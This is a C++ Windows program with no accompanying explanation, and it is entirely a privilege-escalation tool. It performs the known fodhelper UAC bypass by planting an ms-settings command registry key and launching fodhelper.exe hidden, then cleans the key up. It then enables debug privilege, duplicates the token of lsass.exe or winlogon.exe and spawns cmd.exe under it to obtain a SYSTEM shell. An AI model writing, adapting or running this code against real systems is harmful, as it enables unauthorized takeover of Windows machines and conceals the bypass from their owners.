#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <tchar.h>

// Check if the program is running as an administrator
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;

    // Open the current process token
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;

        // Query the elevation status
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    return isAdmin;
}

// Perform UAC bypass using fodhelper
void BypassUAC() {
    const wchar_t* regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    wchar_t command[MAX_PATH];
    swprintf(command, MAX_PATH, L"\"%s\"", exePath);

    const wchar_t* delegate = L"";
    HKEY hKey;

    // Create registry keys for UAC bypass
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)command, (wcslen(command) + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)delegate, sizeof(wchar_t));
        RegCloseKey(hKey);

        // Launch fodhelper.exe to trigger UAC bypass
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"open";
        sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
        sei.nShow = SW_HIDE;

        wprintf(L"Attempting UAC bypass...\n");
        ShellExecuteExW(&sei);

        Sleep(3000); // Wait for the bypass to complete
        RegDeleteTreeW(HKEY_CURRENT_USER, regPath); // Clean up the registry
        exit(0); // Exit the current process
    }
    else {
        wprintf(L"Failed to create registry keys for UAC bypass.\n");
    }
}

// Perform SYSTEM privilege escalation
void Systemprivilegecmd() {
    // Enable debug privileges
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        wprintf(L"Failed to open process token. Error: %d\n", GetLastError());
        return;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        wprintf(L"Failed to lookup debug privilege. Error: %d\n", GetLastError());
        CloseHandle(hToken);
        return;
    }

    TOKEN_PRIVILEGES tp = { 1, { { luid, SE_PRIVILEGE_ENABLED } } };
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        wprintf(L"Failed to adjust token privileges. Error: %d\n", GetLastError());
        CloseHandle(hToken);
        return;
    }

    CloseHandle(hToken);

    // Enumerate processes to find lsass.exe or winlogon.exe
    DWORD idL = 0, idW = 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to create process snapshot. Error: %d\n", GetLastError());
        return;
    }

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                idL = pe.th32ProcessID;
            }
            else if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                idW = pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idL);
    if (!hProcess) {
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idW);
    }

    if (!hProcess) {
        wprintf(L"Failed to open target process. Error: %d\n", GetLastError());
        return;
    }

    // Open the token of the target process
    HANDLE hTokenTarget;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenTarget)) {
        wprintf(L"Failed to open process token. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Duplicate the token for use in a new process
    HANDLE hPrimaryToken;
    if (!DuplicateTokenEx(hTokenTarget, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
        wprintf(L"Failed to duplicate token. Error: %d\n", GetLastError());
        CloseHandle(hTokenTarget);
        CloseHandle(hProcess);
        return;
    }

    CloseHandle(hTokenTarget);
    CloseHandle(hProcess);

    // Prepare startup information
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");

    PROCESS_INFORMATION pi = { 0 };

    // Command to run
    wchar_t cmdPath[] = L"C:\\Windows\\System32\\cmd.exe";

    // Launch cmd.exe using the duplicated token
    if (!CreateProcessWithTokenW(hPrimaryToken, LOGON_NETCREDENTIALS_ONLY, NULL,
        cmdPath, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
        wprintf(L"Failed to create process with token. Error: %d\n", GetLastError());
        CloseHandle(hPrimaryToken);
        return;
    }

    wprintf(L"cmd.exe started successfully.\n");

    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hPrimaryToken);
}

int main() {
    // Check if the program is running as an administrator
    if (!IsRunningAsAdmin()) {
        wprintf(L"Not running as administrator. Attempting UAC bypass...\n");
        BypassUAC();
    }

    // If already running as administrator, proceed with SYSTEM privilege escalation
    wprintf(L"Running as administrator. Proceeding with SYSTEM process creation...\n");
    Systemprivilegecmd();

    // Ensure the program exits immediately
    ExitProcess(0);
}
